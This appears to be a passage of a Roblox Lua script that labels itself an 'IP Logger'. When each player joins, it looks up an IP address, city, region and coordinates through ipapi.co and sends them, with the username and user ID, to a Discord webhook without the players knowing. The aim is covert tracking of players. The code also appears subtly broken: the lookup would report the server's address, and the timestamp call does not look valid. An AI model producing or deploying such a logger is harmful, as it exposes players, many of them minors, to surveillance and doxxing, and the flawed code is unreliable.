-- Function to get IP and region information
local function getIpInfo()
    -- Use an IP geolocation API to get user's IP and region
    local success, response = pcall(function()
        return HttpService:GetAsync("https://ipapi.co/json/")
    end)
    
    if success then
        local data = HttpService:JSONDecode(response)
        return {
            ip = data.ip,
            region = data.region,
            country = data.country_name,
            city = data.city,
            latitude = data.latitude,
            longitude = data.longitude
        }
    else
        warn("Failed to get IP information: " .. tostring(response))
        return {
            ip = "Unknown",
            region = "Unknown",
            country = "Unknown",
            city = "Unknown",
            latitude = "Unknown",
            longitude = "Unknown"
        }
    end
end

-- Function to send data to Discord webhook
local function sendToDiscord(player, ipInfo)
    local embed = {
        title = "User IP and Region Information",
        color = 0x3498db,
        fields = {
            {
                name = "Username",
                value = player.Name,
                inline = true
            },
            {
                name = "User ID",
                value = tostring(player.UserId),
                inline = true
            },
            {
                name = "IP Address",
                value = ipInfo.ip,
                inline = true
            },
            {
                name = "Region",
                value = ipInfo.region,
                inline = true
            },
            {
                name = "Country",
                value = ipInfo.country,
                inline = true
            },
            {
                name = "City",
                value = ipInfo.city,
                inline = true
            },
            {
                name = "Coordinates",
                value = string.format("%s, %s", ipInfo.latitude, ipInfo.longitude),
                inline = true
            }
        },
        footer = {
            text = "Roblox IP Logger"
        },
        timestamp = HttpService:JSONEncode(HttpService:GetCurrentTimeUtc())
    }
    
    local data = {
        embeds = {embed}
    }
    
    local success, response = pcall(function()
        return HttpService:PostAsync(WebhookUrl, HttpService:JSONEncode(data))
    end)
    
    if not success then
        warn("Failed to send to Discord: " .. tostring(response))
        return false
    end
    return true
end

-- Function to handle player joining
local function onPlayerAdded(player)
    print("Logging information for player: " .. player.Name)
    
    -- Wait for character to load if needed
    if not player.Character then
        player.CharacterAdded:Wait()
    end
    
    -- Get IP information
    local ipInfo = getIpInfo()
    print("IP Info retrieved for " .. player.Name)
    
    -- Send to Discord
    local sent = sendToDiscord(player, ipInfo)
    if sent then
        print("Successfully sent data to Discord for " .. player.Name)
    end
    
    -- Return the IP info for potential use in your main script
    return ipInfo
end

-- Connect to player added event
Players.PlayerAdded:Connect(onPlayerAdded)

-- Log existing players when script runs
for _, player in ipairs(Players:GetPlayers()) do
    spawn(function()
        onPlayerAdded(player)
    end)
end

